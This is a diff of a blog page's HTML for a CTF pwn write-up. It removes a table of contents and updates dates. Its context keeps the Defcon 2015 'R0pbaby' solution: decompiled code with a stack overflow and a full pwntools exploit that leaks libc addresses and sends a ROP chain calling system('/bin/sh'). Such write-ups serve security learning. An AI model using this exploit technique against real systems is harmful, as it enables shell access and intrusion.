@@ -101,18 +101,18 @@
 
 
 
-<meta name="description" content="Defcon 2015 Qualifier R0pbaby   湖湘杯 2016 Pwnme200     Defcon 2015 QualifierR0pbabyVuln Points: __int64 sub_C46()&amp;#123;  signed int v0; // eax@4  unsigned __int64 v1; // r14@15  int v2; // er13@17  s">
+<meta name="description" content="Defcon 2015 QualifierR0pbabyVuln Points: __int64 sub_C46()&amp;#123;  signed int v0; // eax@4  unsigned __int64 v1; // r14@15  int v2; // er13@17  size_t v3; // r12@17  int v4; // eax@18  void *handle; //">
 <meta name="keywords" content="Pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RoutineTraining Pwn">
 <meta property="og:url" content="http://yoursite.com/CTF/Writeup/RoutineTraining-Pwn/index.html">
 <meta property="og:site_name" content="Xu&#39;s Blog">
-<meta property="og:description" content="Defcon 2015 Qualifier R0pbaby   湖湘杯 2016 Pwnme200     Defcon 2015 QualifierR0pbabyVuln Points: __int64 sub_C46()&amp;#123;  signed int v0; // eax@4  unsigned __int64 v1; // r14@15  int v2; // er13@17  s">
+<meta property="og:description" content="Defcon 2015 QualifierR0pbabyVuln Points: __int64 sub_C46()&amp;#123;  signed int v0; // eax@4  unsigned __int64 v1; // r14@15  int v2; // er13@17  size_t v3; // r12@17  int v4; // eax@18  void *handle; //">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-08-10T08:04:59.150Z">
+<meta property="og:updated_time" content="2017-08-25T09:55:53.308Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RoutineTraining Pwn">
-<meta name="twitter:description" content="Defcon 2015 Qualifier R0pbaby   湖湘杯 2016 Pwnme200     Defcon 2015 QualifierR0pbabyVuln Points: __int64 sub_C46()&amp;#123;  signed int v0; // eax@4  unsigned __int64 v1; // r14@15  int v2; // er13@17  s">
+<meta name="twitter:description" content="Defcon 2015 QualifierR0pbabyVuln Points: __int64 sub_C46()&amp;#123;  signed int v0; // eax@4  unsigned __int64 v1; // r14@15  int v2; // er13@17  size_t v3; // r12@17  int v4; // eax@18  void *handle; //">
 
 
 
@@ -327,8 +327,8 @@
               
                 <span class="post-meta-item-text">更新于</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2017-08-10T16:04:59+08:00">
-                2017-08-10
+              <time title="更新于" itemprop="dateModified" datetime="2017-08-25T17:55:53+08:00">
+                2017-08-25
               </time>
             
           </span>
@@ -394,19 +394,7 @@
       
 
       
-        <!-- MarkdownTOC -->
-<ul>
-<li><a href="#defcon-2015-qualifier">Defcon 2015 Qualifier</a><ul>
-<li><a href="#r0pbaby">R0pbaby</a></li>
-</ul>
-</li>
-<li><a href="#%E6%B9%96%E6%B9%98%E6%9D%AF-2016">湖湘杯 2016</a><ul>
-<li><a href="#pwnme200">Pwnme200</a></li>
-</ul>
-</li>
-</ul>
-<!-- /MarkdownTOC -->
-<h2 id="Defcon-2015-Qualifier"><a href="#Defcon-2015-Qualifier" class="headerlink" title="Defcon 2015 Qualifier"></a>Defcon 2015 Qualifier</h2><h3 id="R0pbaby"><a href="#R0pbaby" class="headerlink" title="R0pbaby"></a>R0pbaby</h3><p>Vuln Points:</p>
+        <h2 id="Defcon-2015-Qualifier"><a href="#Defcon-2015-Qualifier" class="headerlink" title="Defcon 2015 Qualifier"></a>Defcon 2015 Qualifier</h2><h3 id="R0pbaby"><a href="#R0pbaby" class="headerlink" title="R0pbaby"></a>R0pbaby</h3><p>Vuln Points:</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">sub_C46</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v0; <span class="comment">// eax@4</span></div><div class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// r14@15</span></div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// er13@17</span></div><div class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// r12@17</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax@18</span></div><div class="line">  <span class="keyword">void</span> *handle; <span class="comment">// [sp+8h] [bp-448h]@1</span></div><div class="line">  <span class="keyword">char</span> nptr[<span class="number">1088</span>]; <span class="comment">// [sp+10h] [bp-440h]@2</span></div><div class="line">  __int64 savedregs; <span class="comment">// [sp+450h] [bp+0h]@22</span></div><div class="line">...</div><div class="line">...</div><div class="line">        <span class="keyword">if</span> ( v1 )</div><div class="line">        &#123;</div><div class="line">          v2 = <span class="number">0</span>;</div><div class="line">          v3 = <span class="number">0L</span>L;</div><div class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">          &#123;</div><div class="line">            v4 = _IO_getc(<span class="built_in">stdin</span>);</div><div class="line">            <span class="keyword">if</span> ( v4 == <span class="number">-1</span> )</div><div class="line">              <span class="keyword">break</span>;</div><div class="line">            nptr[v3] = v4;</div><div class="line">            ++v2;</div><div class="line">            v3 = v2;</div><div class="line">            <span class="keyword">if</span> ( v1 &lt;= v2 )</div><div class="line">              <span class="keyword">goto</span> LABEL_22;</div><div class="line">          &#125;</div><div class="line">          v3 = v2 + <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">          v3 = <span class="number">0L</span>L;</div><div class="line">        &#125;</div><div class="line">LABEL_22:</div><div class="line">        <span class="built_in">memcpy</span>(&amp;savedregs, nptr, v3);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>Exp:</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getsymbol</span><span class="params">(symbol)</span>:</span></div><div class="line">	io.recvuntil(<span class="string">'4) Exit\n:'</span>)</div><div class="line">	io.sendline(<span class="string">'2'</span>)</div><div class="line">	io.recvuntil(<span class="string">'Enter symbol:'</span>)</div><div class="line">	io.sendline(symbol)</div><div class="line">	data = io.recvline()</div><div class="line">	data = data[data.find(<span class="string">'0x'</span>):<span class="number">-1</span>]</div><div class="line">	data = long(data,<span class="number">16</span>)</div><div class="line">	<span class="keyword">return</span> data</div><div class="line"></div><div class="line">popreiOffset = <span class="number">0x000000000001fc3a</span></div><div class="line">systemOffset = libc.symbols[<span class="string">'system'</span>]</div><div class="line">log.info(<span class="string">'system offset:'</span> + str(systemOffset))</div><div class="line">binshoffset = libc.search(<span class="string">'/bin/sh'</span>).next()</div><div class="line">log.info(<span class="string">'binsh offset:'</span> + str(binshoffset))</div><div class="line"></div><div class="line">systemAddress = getsymbol(<span class="string">'system'</span>)</div><div class="line">libcbase = systemAddress - systemOffset</div><div class="line">log.info(<span class="string">'libcbase:'</span> + hex(libcbase))</div><div class="line">binshAddress = libcbase + binshoffset</div><div class="line">log.info(<span class="string">'binshAddress:'</span> + hex(binshAddress))</div><div class="line">popreiAddress = libcbase + popreiOffset</div><div class="line">log.info(<span class="string">"poprdiAddress: "</span> + hex(popreiAddress))</div><div class="line"></div><div class="line">io.recvuntil(<span class="string">'4) Exit\n:'</span>)</div><div class="line">io.sendline(<span class="string">'3'</span>)</div><div class="line">io.recvuntil(<span class="string">'Enter bytes to send (max 1024):'</span>)</div><div class="line">io.sendline(<span class="string">'50'</span>)</div><div class="line"></div><div class="line">raw_input()</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span> * <span class="number">8</span> + p64(popreiAddress) + p64(binshAddress) + p64(systemAddress) + <span class="string">'ABCDABCD'</span></div><div class="line">io.sendline(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
@@ -533,7 +521,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-count">10</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -654,7 +642,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共5.0k字</span>
+  <span class="post-count">博客全站共5.3k字</span>
 </div>
         
 
